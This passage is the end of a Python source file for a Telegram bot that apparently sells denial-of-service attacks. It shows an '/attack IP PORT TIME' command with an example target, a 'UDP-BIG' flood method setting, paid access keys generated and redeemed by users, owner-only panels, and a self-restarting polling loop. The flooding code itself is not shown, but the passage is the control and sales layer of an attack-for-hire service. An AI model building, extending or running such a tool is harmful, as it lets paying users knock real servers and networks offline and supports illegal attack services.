                "┊  🪼 𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐎𝐌𝐌𝐀𝐍𝐃    ┊\n"
                "└┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┘\n\n"       
                "📌 ᴜꜱᴀɢᴇ ➪ \n"
                "◆ /attack 𝐈𝐏 𝐏𝐎𝐑𝐓 𝐓𝐈𝐌𝐄\n\n"
                "📝 ᴇxᴀᴍᴘʟᴇ ➪ \n"
                "◆ /attack 𝟏.𝟐.𝟑.𝟒 𝟖𝟎 𝟔𝟎",
                parse_mode="HTML")
            return

        if btype == "STATUS":
            do_status(msg); return

        if btype == "PROFILE":
            do_profile(msg); return

        if btype == "OWNER_PANEL":
            if not is_owner(uid):
                safe_reply(msg, "🚫 ᴏᴡɴᴇʀ ᴏɴʟʏ!"); return
            safe_reply(msg,
                "📊 <b>ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ ᴏᴘᴇɴᴇᴅ</b>\n"
                "⚡ ᴜꜱᴇ ʙᴜᴛᴛᴏɴꜱ ʙᴇʟᴏᴡ",
                reply_markup=kb_owner(), parse_mode="HTML")
            return

        if btype == "REDEEM":
            safe_reply(msg,
                "  📝 <code>/redeem Yᴀᴀɴ KᴇY DᴀL LᴀUᴅE</code>",
                parse_mode="HTML")
            return

        if btype == "GEN_KEY":
            if not is_owner(uid):
                safe_reply(msg, "🚫 ᴏᴡɴᴇʀ ᴏɴʟʏ!"); return
            safe_reply(msg,
                "  📝 <code>/genkey DURATION [AMOUNT] [NAME]</code>\n\n"
                "  📌 <code>/genkey 1d 5</code>\n"
                "  📌 <code>/genkey 1month 10 VIP</code>",
                parse_mode="HTML")
            return

        if btype == "STATS":
            if not is_owner(uid):
                safe_reply(msg, "🚫 ᴏᴡɴᴇʀ ᴏɴʟʏ!"); return
            do_stats(msg); return

        if btype == "USERS":
            if not is_owner(uid):
                safe_reply(msg, "🚫 ᴏᴡɴᴇʀ ᴏɴʟʏ!"); return
            do_users(msg); return

        if btype == "BROADCAST":
            if not is_owner(uid):
                safe_reply(msg, "🚫 ᴏᴡɴᴇʀ ᴏɴʟʏ!"); return
            safe_reply(msg,
                "  📝 <code>/broadcast Jᴏ Mᴇssᴀɢᴇ Bʜᴇɪɴᴀ Hᴀɪ Wᴏʜ Dᴀʟ Lᴀᴜᴅᴇ</code>",
                parse_mode="HTML")
            return

        if btype == "SETTINGS":
            if not is_owner(uid):
                safe_reply(msg, "🚫 ᴏᴡɴᴇʀ ᴏɴʟʏ!"); return
            cmd_settings(msg); return

        if btype == "CLOSE":
            safe_reply(msg, "❌ ᴄʟᴏꜱᴇᴅ.", reply_markup=kb_main(uid)); return

    except Exception as e:
        HEALTH["total_errors"] += 1
        print(f"❌ universal_button_handler error: {e}")
        traceback.print_exc()

# ============= MAIN POLLING =============
print("=" * 60)
print(f"  {BOT_NAME}")
print("=" * 60)
print(f"  👑 Owner: {BOT_OWNER}")
print(f"  🔑 Token: {get_setting('api_token', DEFAULT_API_TOKEN)[:20]}...")
print(f"  🎯 Method: {get_setting('api_method', 'UDP-BIG')}")
print(f"  🕐 IST Time: {ist_full_str()}")
print(f"  ⚙️ Update Interval: {UPDATE_INTERVAL}s")
print(f"  ⏹️ Auto-Stop After: {AUTO_STOP_AFTER}s")
print(f"  ✅ Owner check: {is_owner(BOT_OWNER)}")
print(f"  📊 Stickers: {len(ensure_list(data.get('stickers', [])))}")
print(f"  📹 Videos: {len(ensure_list(data.get('videos', [])))}")
print(f"  🎬 PYF Videos: {len(ensure_list(data.get('pyf_videos', [])))}")
print("=" * 60)
print("  ✅ Bot running")
print("=" * 60)

def polling_worker():
    global bot
    consecutive_failures = 0
    while True:
        try:
            try:
                bot.remove_webhook()
                time.sleep(0.5)
            except Exception as e:
                print(f"⚠️ Webhook remove warning: {str(e)[:100]}")

            print(f"🔄 Polling started at {ist_full_str()}")
            consecutive_failures = 0

            bot.polling(
                interval=0.3,
                timeout=30,
                long_polling_timeout=25
            )

        except Exception as e:
            consecutive_failures += 1
            print(f"⚠️ Polling Error #{consecutive_failures}: {str(e)[:200]}")

            if consecutive_failures < 3:
                sleep_time = 1
            elif consecutive_failures < 10:
                sleep_time = 3
            else:
                sleep_time = 10

            print(f"⏳ Restarting in {sleep_time}s...")
            time.sleep(sleep_time)

            if consecutive_failures % 20 == 0:
                try:
                    bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)
                    print("🔧 Bot re-initialized")
                except Exception as reinit_err:
                    print(f"❌ Re-init failed: {reinit_err}")

polling_thread = threading.Thread(target=polling_worker, daemon=True)
polling_thread.start()

try:
    while True:
        time.sleep(60)
        if not polling_thread.is_alive():
            print("⚠️ Polling thread died, restarting...")
            polling_thread = threading.Thread(target=polling_worker, daemon=True)
            polling_thread.start()
except KeyboardInterrupt:
    print("\n🛑 Bot stopped by user.")
